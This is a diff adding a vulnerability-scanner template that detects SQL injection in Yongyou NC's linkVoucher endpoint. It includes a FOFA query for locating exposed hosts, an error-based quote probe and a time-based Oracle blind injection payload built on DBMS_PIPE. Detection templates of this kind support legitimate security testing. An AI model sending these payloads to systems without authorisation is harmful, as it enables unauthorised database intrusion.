@@ -1,0 +1,50 @@
+id: poc-yaml-yongyou-nc-linkvoucher-sqli
+info:
+  name: Yongyou NC linkVoucher SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: Yongyou NC
+    fofa-query: "app=\"用友-UFIDA-NC\""
+
+variables:
+  t1: "{{rand_int(2,4)}}"
+  t2: "{{to_number(t1) * 3}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1%27 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "sql:SELECT"
+          - "引号内的字符串没有正确结束"
+        part: body
+
+  - raw:
+      - |
+        GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1%27)%20AND%208087=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(97)||CHR(86)||CHR(111),{{t1}})--%20alWX HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ufida"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t3)"
